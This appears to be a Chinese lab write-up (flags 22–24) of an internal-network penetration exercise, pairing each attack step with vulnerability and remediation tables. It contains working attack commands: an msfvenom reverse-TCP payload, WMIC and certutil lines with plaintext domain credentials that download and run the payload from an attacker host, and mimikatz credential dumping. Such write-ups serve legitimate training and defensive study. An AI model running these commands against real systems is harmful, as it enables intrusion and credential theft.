+<p>flag21 任务通过对 Linux 系统的 <code>/var/log/secure</code> 登录日志进行分析，识别出管理员远程登录的来源 IP，并以此为突破点，利用 SMB 服务未设访问控制和弱口令问题，成功发起密码爆破并获取 Flag。<br>
+该过程清晰展示了日志泄露、服务暴露、口令管理不足和访问控制松散四类典型内网安全漏洞。有效防护应从<strong>日志审计、访问控制、身份认证机制、暴力破解防护</strong>四个层面入手，构建更稳固的内网防线。</p>
+<hr>
+<h1 id="8-实验八">8. 实验八</h1>
+<h2 id="问题二十二">问题二十二</h2>
+<h3 id="渗透流程-21">渗透流程</h3>
+<p>&lt;任意文件读取&gt;
+获取管理员电脑中C盘的flag22。</p>
+<ol>
+<li>
+<p>使用 psexec模块 接管权限
+已经获取了administrator用户的密码，可以使用 msf 中的 psexec模块 对windows机器进行攻击</p>
+</li>
+<li>
+<p>夺旗：flag22
+使用 Meterpreter 读取C盘下的 flag22{7c043d4b5b12055c}。<img src="703bf6a499ce54ef4aef2ee44ac88726_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-21"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞阶段</th>
+          <th>漏洞描述</th>
+          <th>利用方式</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>SMB 服务暴露</strong></td>
+          <td>Windows 目标主机开放了 SMB（445）端口，允许基于身份认证进行远程访问。</td>
+          <td>使用 Metasploit 的 <code>psexec</code> 模块，依赖 SMB 接口远程执行命令。</td>
+      </tr>
+      <tr>
+          <td><strong>弱密码/已知凭据滥用</strong></td>
+          <td>获取的 <code>administrator</code> 密码未及时更新或过于简单，导致可重用。</td>
+          <td>使用已知密码登录远程主机，实现身份提升。</td>
+      </tr>
+      <tr>
+          <td><strong>命令执行权限控制不严</strong></td>
+          <td>SMB 身份认证成功即赋予远程命令执行权限，缺乏细粒度授权。</td>
+          <td>利用合法 SMB 账户直接投放 Meterpreter 会话并控制目标系统。</td>
+      </tr>
+      <tr>
+          <td><strong>后门控制无检测机制</strong></td>
+          <td>未部署入侵检测系统，无法识别并阻断 Meterpreter 反向连接和命令。</td>
+          <td>Meterpreter 提供全权限文件系统访问能力，读取机密文件（flag22）。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-20"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>攻击阶段</th>
+          <th>防御建议</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>SMB 服务暴露</strong></td>
+          <td>禁止 SMB 端口对公网开放，仅限内网可访问；使用防火墙策略限制指定 IP/网段访问 SMB。</td>
+      </tr>
+      <tr>
+          <td><strong>账户权限滥用</strong></td>
+          <td>避免使用默认 <code>administrator</code>，可更名或禁用；配置最小权限原则（Least Privilege）；启用登录失败锁定策略。</td>
+      </tr>
+      <tr>
+          <td><strong>远程命令执行</strong></td>
+          <td>关闭 <code>Admin$</code> 等远程共享；禁用远程服务安装权限，阻断 <code>psexec</code> 类工具使用途径。</td>
+      </tr>
+      <tr>
+          <td><strong>后门植入与控制</strong></td>
+          <td>部署 IDS/IPS 系统监测 Meterpreter 特征行为（如反向 TCP）；启用 Windows Defender ATP 或 EDR 方案进行实时行为监控。</td>
+      </tr>
+      <tr>
+          <td><strong>敏感文件访问保护</strong></td>
+          <td>为敏感路径（如 <code>C:\</code> 根目录）设置访问权限控制；开启审计日志，记录所有关键目录文件的访问行为。</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h3 id="总结-21"><strong>总结</strong></h3>
+<p>flag22 的获取过程集中展现了 <strong>SMB 服务漏洞链</strong>的典型攻击模式：<br>
+<strong>凭据重用 → 模块投放 → 后门控制 → 文件读取</strong>。
+此类攻击尤其常见于缺乏有效网络分段、账户权限过高、系统缺乏审计机制的环境中。
+<strong>防守关键点应聚焦于：</strong></p>
+<ul>
+<li>账户安全（密码复杂性、权限最小化）；</li>
+<li>网络隔离（防止横向渗透）；</li>
+<li>后门监控（检测异常连接和行为）；</li>
+<li>主机防护（系统日志、共享服务审计）。</li>
+</ul>
+<h2 id="问题二十三">问题二十三</h2>
+<h3 id="渗透流程-22">渗透流程</h3>
+<p>&lt;Meterpreter 后门&gt; + &lt;mimikatz 提取密码&gt;
+获取 域账号eviluser 的密码（flag23）</p>
+<ol>
+<li>
+<p>使用 Meterpreter 的 mimikatz模块
+Meterpreter 中默认自带 mimikatz模块 ，可以使用<code>load mimikatz</code>
+但是mimikatz执行失败了</p>
+</li>
+<li>
+<p>上传并执行 mimikatz
+将攻击机上的 mimikatz工具 上传到目标主机中，
+在 meterpreter 中切换到shell。</p>
+<p>执行 mimikatz
+执行 privilege::debug 提权</p>
+</li>
+<li>
+<p>夺旗：flag23
+读取当前登录账号密码，执行命令:sekurlsa::logonpasswords，
+所读取内容就是flag23。
+flag23{1gaz2wsx!QAZ@WSX}。<img src="00395d16005e4a5a71529df5c8d33bb1_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-22"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>初始控制</td>
+          <td>Meterpreter 会话</td>
+          <td>攻击者通过远程渗透获得 Meterpreter 会话，具备目标系统的控制权限。</td>
+      </tr>
+      <tr>
+          <td>工具上传</td>
+          <td>mimikatz 上传</td>
+          <td>利用 Meterpreter 上传 mimikatz 到目标主机，规避被禁用模块的限制。</td>
+      </tr>
+      <tr>
+          <td>权限提升</td>
+          <td>privilege::debug</td>
+          <td>通过启用调试权限（SeDebugPrivilege）获取更高访问级别，访问 LSASS 所需。</td>
+      </tr>
+      <tr>
+          <td>信息提取</td>
+          <td>sekurlsa::logonpasswords</td>
+          <td>使用 mimikatz 直接从内存中提取当前登录用户（域账号）的明文密码和 NTLM Hash。</td>
+      </tr>
+      <tr>
+          <td>凭据获取</td>
+          <td>获得域用户密码</td>
+          <td>获取目标域用户 <code>eviluser</code> 的明文密码，成功读取 flag23。</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h3 id="修复建议-21"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>mimikatz 提取密码</td>
+          <td>1. 启用 Credential Guard，防止从内存中提取明文凭据。2. 禁用 WDigest 认证（防止明文密码被加载）。3. 启用 LSASS 保护（RunAsPPL），限制 mimikatz 访问权限。4. 加强主机杀毒策略，检测和阻断 mimikatz 行为特征。</td>
+      </tr>
+      <tr>
+          <td>调试权限滥用</td>
+          <td>1. 禁用 SeDebugPrivilege，普通用户默认不应拥有此权限。2. 通过组策略限制账户权限分配，仅特定管理员账户具备调试权限。</td>
+      </tr>
+      <tr>
+          <td>Meterpreter 控制</td>
+          <td>1. 使用主机入侵检测系统（HIDS）识别 Meterpreter 连接特征。2. 监控非常规 shell 连接及长时间空闲会话。3. 加强网络边界防护，限制反弹 shell 的出口连接。</td>
+      </tr>
+      <tr>
+          <td>凭据缓存风险</td>
+          <td>1. 禁用不必要的登录类型，如 RDP、远程服务。2. 设置账户登录失败锁定策略，防止暴力尝试。3. 定期清理凭据缓存与重启服务，减少暴露窗口。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-22"><strong>总结</strong></h3>
+<p>该攻击过程通过已获取的 Meterpreter 会话为基础，上传并执行 mimikatz 工具，成功提取域用户 <code>eviluser</code> 的明文密码，体现了典型的后渗透攻击链：控制会话 → 权限提权 → 凭据获取。mimikatz 是最常被用于 Windows 环境的密码提取工具，其强大功能要求防御方必须从主机加固、内存保护、权限控制、日志审计等多方面入手构建纵深防御体系。</p>
+<h2 id="问题二十四">问题二十四</h2>
+<p>&lt;远程命令执行(WMIC)&gt; + &lt;弱口令漏洞&gt;
+获取 域控服务器C盘下的flag</p>
+<ol>
+<li>
+<p>查找域控
+查看域用户 <code>net user /domain</code>
+查看域控 <code>net group“domain controllers” /domain</code>
+查看域内主机列表</p>
+</li>
+<li>
+<p>查找域控IP
+从上面命令知道了域名为 adsec.com，域控主机名为 win2016-dc01，使用ping命令得到ip</p>
+</li>
+<li>
+<p>psexec 接管域控
+已经知道了域控的机器，和一个域内的用户，尝试使用 psexec 的方式来攻击域控机器。
+但此方法失败了。</p>
+</li>
+<li>
+<p>生成木马
+通过psexec得到meterpreter shell的方法失败，尝试下列方法</p>
+<ol>
+<li>生成木马</li>
+<li>使用wmic通过域控下载msf木马(需要一个http服务，提供木马下载链接)</li>
+<li>执行木马
+<code>msfvenom -p windows/meterpreter/reverse tcp host=202.1.1.20 lport=5555 -f exe -o msfexe</code></li>
+</ol>
+</li>
+<li>
+<p>启动木马并反弹监听端口
+在当前目录中搭建简易web服务器，
+后重新启动一个 msfconsole 终端，并监听5555端口。<img src="41eb8e61aabf7a89a6558653177d1885_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>使用域用户下载木马
+<code>wmic /node:192.168.8.80 /user:eviluser /password:&quot;1gaz2wsx!QAZ@WSX&quot; process call create &quot;cmd.exe /c certutil.exe -urlcache -split -f http://202.1.1.20:7777/msfexe C:\\msf.exe&quot;</code><img src="25360289bdf82bbd9a7fe88478e59418_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>使用域用户执行木马
+执行下载命令后，msfexe 就已经在 192.168.8.80的c盘根目录中了，再执行一次命令使其运行。
+<code>wmic /node:192.168.8.80 /user:eviluser /password:&quot;1gaz2wsx!QAZ@WSX&quot; process call create &quot;cmd.exe /c C:\\msfexe&quot;</code></p>
+</li>
+<li>
+<p>夺旗：flag24
+执行木马后，反弹端口监听到来自 meterpreter 的会话。
+直接查看C盘目录的 flag24.txt 即可。
+内容：flag25{fb547ec167bc8389}<img src="e9f0b883c500063405ce82b5b398f0e8_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-23"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>域信息收集</td>
+          <td>net user /domain、net group /domain</td>
+          <td>利用域查询命令获取域名、域控主机名等关键信息。</td>
+      </tr>
+      <tr>
+          <td>域控定位</td>
+          <td>ping 获取 IP</td>
+          <td>通过域控主机名解析获得对应 IP，便于远程连接。</td>
+      </tr>
+      <tr>
+          <td>初始尝试失败</td>
+          <td>PsExec 利用失败</td>
+          <td>SMB 防护或权限控制阻止了 psexec 成功执行。</td>
+      </tr>
+      <tr>
+          <td>木马生成</td>
+          <td>msfvenom 创建反向 shell</td>
+          <td>使用 msfvenom 创建 Windows 平台下的反向连接木马。</td>
+      </tr>
+      <tr>
+          <td>文件传输</td>
+          <td>certutil 下载木马</td>
+          <td>利用 WMIC 执行 certutil 从外部 HTTP 服务下载木马到目标主机。</td>
+      </tr>
+      <tr>
+          <td>木马执行</td>
+          <td>WMIC 执行 payload</td>
+          <td>再次利用 WMIC 执行目标主机上木马，触发反向连接。</td>
+      </tr>
+      <tr>
+          <td>系统控制</td>
+          <td>Meterpreter 会话建立</td>
+          <td>成功接管目标系统后进入 Meterpreter 会话。</td>
+      </tr>
+      <tr>
+          <td>信息获取</td>
+          <td>获取 flag24.txt</td>
+          <td>访问域控 C 盘，成功读取 flag24 内容。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-22"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>远程命令执行（WMIC）</td>
+          <td>1. 禁用或限制 WMIC 使用范围，限制普通域用户远程调用权限。2. 阻断 TCP 135、445 等远程管理端口，防止 DCOM/RPC 滥用。</td>
+      </tr>
+      <tr>
+          <td>反向连接木马</td>
+          <td>1. 部署 IDS/IPS 检测反向 shell 通信行为（如 Meterpreter、C2 Beacon）。2. 对外通信设置白名单策略，禁止服务器主动连接外部未授权主机。</td>
+      </tr>
+      <tr>
+          <td>域用户权限控制</td>
+          <td>1. 落实最小权限原则，域用户不应具备远程进程创建能力。2. 开启账户操作审计，及时发现远程命令异常行为。</td>
+      </tr>
+      <tr>
+          <td>木马下载工具滥用</td>
+          <td>1. 限制 certutil、powershell、bitsadmin 等可被滥用的系统工具访问外部网络。2. 配置应用白名单，仅允许授权程序执行。</td>
+      </tr>
+      <tr>
+          <td>密码管理</td>
+          <td>1. 强制域用户使用强密码策略，并定期轮换。2. 引入 MFA，防止凭据泄露后被滥用。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-23"><strong>总结</strong></h3>
+<p>本攻击链展示了攻击者在常规方法（如 PsExec）失效后，灵活切换至 WMIC 与 certutil 组合实现文件传输与远程执行，最终获取域控主机控制权，并成功提取 flag24 内容。此类攻击体现了典型的“绕过式渗透”策略，强调了对系统管理工具（Living off the Land Binaries, LOLBins）的滥用问题。</p>
+<p>应对建议包括加强主机与网络边界防护、限制脚本工具行为、细化用户权限模型，并结合行为监控和多因素认证实现整体防护闭环。</p>
+<hr>
+</article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
+<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />
+
+  
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>
+
+
+
+
+
+
+
+</html>
